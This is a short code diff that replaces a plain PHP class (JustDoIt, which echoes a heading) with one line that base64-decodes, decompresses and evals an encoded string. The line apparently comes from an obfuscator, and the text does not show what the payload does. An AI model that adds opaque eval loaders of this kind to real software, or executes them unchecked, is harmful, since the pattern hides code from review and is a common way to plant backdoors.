@@ -1,12 +1,1 @@
-<?php
-
-namespace Sqlnr\App;
-
-class JustDoIt
-{
-    public function doIt()
-    {
-        echo getVar();
-        echo '<h1>Just do it!</h1>';
-    }
-}
+<?php ob_start();$akugkjugkjgkujfkhdjdutduydihfoufkudysiyikufolufkudikydiufoujfoudkyxujtsyrsrfsytgdihogipigogoakugkjugkjgkujfkhdjdutduydihfoufkudysiyikufolufkudikydiufoujfoudkyxujtsyrsrfsytgdihogipigogoakugkjugkjgkujfkhdjdutduydihfoufkudysiyikufolufkudikydiufoujfoudkyxujtsyrsrfsytgdihogipigogo='eNoljDELwjAUhHd/xTm1ncQ5oUVwsavgJJQ0fZpAfHk2yST970Ycv7vvLs4T8TLZQIbbTg29HsTJDmxelMRYwvUdeL2fRBRsMClhLCmf4yXjAylz8BaPwjb7yFhq3Ha1IOsinpRvZq2vf2y0O/a/cdXg814fKjcKG7YvM4ksnw==';eval(gzuncompress(base64_decode($akugkjugkjgkujfkhdjdutduydihfoufkudysiyikufolufkudikydiufoujfoudkyxujtsyrsrfsytgdihogipigogoakugkjugkjgkujfkhdjdutduydihfoufkudysiyikufolufkudikydiufoujfoudkyxujtsyrsrfsytgdihogipigogoakugkjugkjgkujfkhdjdutduydihfoufkudysiyikufolufkudikydiufoujfoudkyxujtsyrsrfsytgdihogipigogo)));$v=ob_get_contents();ob_end_clean(); echo $v;
